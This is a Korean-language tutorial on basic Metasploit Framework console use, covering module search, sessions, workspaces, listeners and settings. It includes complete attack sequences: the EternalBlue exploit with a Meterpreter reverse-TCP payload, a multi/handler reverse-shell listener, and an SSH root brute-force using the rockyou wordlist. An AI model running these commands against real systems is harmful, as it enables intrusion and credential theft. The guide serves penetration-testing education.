# Metasploit Framework 기본 사용법

## msfconsole 시작하기

### 기본 실행

```bash
# 콘솔 시작
msfconsole

# 배너 없이 시작
msfconsole -q

# 특정 리소스 파일로 시작
msfconsole -r /path/to/resource.rc

# 데이터베이스 없이 시작
msfconsole -n
```

### 첫 실행 체크리스트

```bash
# 데이터베이스 연결 확인
msf6 > db_status

# 사용 가능한 모듈 수 확인
msf6 > show exploits | wc -l
msf6 > show payloads | wc -l
msf6 > show auxiliary | wc -l

# 업데이트 확인
msf6 > version
```

## 기본 명령어

### 정보 확인 명령어

```bash
# 도움말
msf6 > help
msf6 > ?

# 버전 정보
msf6 > version

# 현재 상태
msf6 > info

# 히스토리
msf6 > history
```

### 모듈 탐색

```bash
# 모든 익스플로잇 보기
msf6 > show exploits

# 페이로드 목록
msf6 > show payloads

# 보조 모듈 목록
msf6 > show auxiliary

# 인코더 목록
msf6 > show encoders

# NOP 목록
msf6 > show nops

# 특정 플랫폼 필터링
msf6 > show exploits platform:windows
msf6 > show exploits platform:linux
```

### 검색 기능

```bash
# 키워드로 검색
msf6 > search ssh
msf6 > search type:exploit platform:windows

# CVE 번호로 검색
msf6 > search cve:2017-0144

# 랭킹별 검색
msf6 > search rank:excellent

# 날짜별 검색
msf6 > search date:2021

# 복합 검색
msf6 > search type:exploit platform:linux rank:good ssh
```

## 모듈 사용법

### 익스플로잇 모듈 사용

```bash
# 모듈 선택
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 모듈 정보 확인
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

# 옵션 확인
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 필수 옵션 설정
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 페이로드 설정
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444

# 실행
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
# 또는
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

### 보조 모듈 사용

```bash
# 스캐너 모듈 예시
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

# 브루트포스 모듈 예시
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

## 세션 관리

### 세션 확인 및 조작

```bash
# 활성 세션 목록
msf6 > sessions

# 세션 상세 정보
msf6 > sessions -i

# 특정 세션과 상호작용
msf6 > sessions -i 1

# 세션 백그라운드로 보내기 (세션 내에서)
meterpreter > background

# 모든 세션 종료
msf6 > sessions -K

# 특정 세션 종료
msf6 > sessions -k 1
```

### 세션 업그레이드

```bash
# 쉘을 Meterpreter로 업그레이드
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run
```

## 워크스페이스 관리

### 워크스페이스 기본 조작

```bash
# 현재 워크스페이스 확인
msf6 > workspace

# 워크스페이스 목록
msf6 > workspace -l

# 새 워크스페이스 생성
msf6 > workspace -a target_company

# 워크스페이스 전환
msf6 > workspace target_company

# 워크스페이스 삭제
msf6 > workspace -d old_workspace
```

### 데이터 관리

```bash
# 호스트 정보 확인
msf6 > hosts

# 서비스 정보 확인
msf6 > services

# 취약점 정보 확인
msf6 > vulns

# 크리덴셜 정보 확인
msf6 > creds

# 데이터 임포트
msf6 > db_import /path/to/nmap_scan.xml

# 데이터 익스포트
msf6 > db_export -f xml /path/to/export.xml
```

## 페이로드 생성 및 관리

### 기본 페이로드 설정

```bash
# 사용 가능한 페이로드 확인 (익스플로잇 선택 후)
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

# 호환되는 페이로드만 보기
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads -c

# 페이로드 설정
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### 페이로드 옵션 확인

```bash
# 페이로드 옵션 보기
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 페이로드 고급 옵션
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced
```

## 리스너 설정

### 멀티핸들러 사용

```bash
# 멀티핸들러 설정
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j  # 백그라운드 작업으로 실행
```

### 다중 리스너 관리

```bash
# 작업 목록 확인
msf6 > jobs

# 작업 상세 정보
msf6 > jobs -i

# 특정 작업 종료
msf6 > kill 1
```

## 환경 설정

### 글로벌 변수 설정

```bash
# 글로벌 변수 설정
msf6 > setg LHOST 192.168.1.50
msf6 > setg LPORT 4444

# 글로벌 변수 확인
msf6 > getg

# 글로벌 변수 삭제
msf6 > unsetg LHOST
```

### 설정 저장

```bash
# 현재 설정을 리소스 파일로 저장
msf6 > makerc /tmp/my_settings.rc

# 리소스 파일 실행
msf6 > resource /tmp/my_settings.rc
```

## 유용한 팁

### 명령어 단축키

```bash
# 이전 명령어: 위/아래 화살표
# 명령어 완성: Tab
# 검색 히스토리: Ctrl+R
# 줄 시작: Ctrl+A
# 줄 끝: Ctrl+E
# 화면 지우기: Ctrl+L
```

### 출력 제어

```bash
# 출력을 파일로 저장
msf6 > spool /tmp/msf_output.log

# 스풀링 중지
msf6 > spool off

# 명령어 출력을 파이프로 전달
msf6 > show exploits | grep windows
```

### 디버깅

```bash
# 디버그 모드 활성화
msf6 > setg LogLevel 3

# 세부 로그 확인
msf6 > setg ConsoleLogging true
```
